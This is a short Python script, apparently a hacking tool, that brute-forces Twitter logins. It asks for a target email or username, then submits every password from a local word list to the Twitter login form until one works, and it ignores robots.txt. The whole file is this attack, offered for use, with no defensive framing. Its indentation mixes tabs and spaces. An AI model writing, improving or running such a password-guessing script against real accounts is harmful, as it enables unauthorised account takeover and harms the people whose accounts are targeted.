import mechanize
import signal

def twitter_brute():
	
	br=mechanize.Browser()
	print("[*]Browser Initialized[*]")
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
	br.open('https://twitter.com/login')
	email_username=raw_input("Enter the email address or username:")
	passfile=open("./password_lists/passwords.txt","r")

	
	for password in passfile.readlines():
		
		password=password.rstrip('\n')
	
		try:

			br.select_form(nr=1)
			br.form['session[username_or_email]']=email_username
			br.form['session[password]']=password
			resp=br.submit()

			if 'error' in resp.geturl():
				print('\x1b[0;30;41m'"[!]Incorrect Password (%s)" %(password)+'\x1b[0m')
				br=mechanize.Browser()
				br.set_handle_equiv(True)
			        br.set_handle_redirect(True)
        			br.set_handle_referer(True)
       				br.set_handle_robots(False)
				br.open('https://twitter.com/login')

			else:
                                print('\x1b[0;30;42m'+"[+]Correct Password (%s)" %(password)+'\x1b[0m')
				break

		except KeyboardInterrupt:
			print("\nQuitting..")
			return
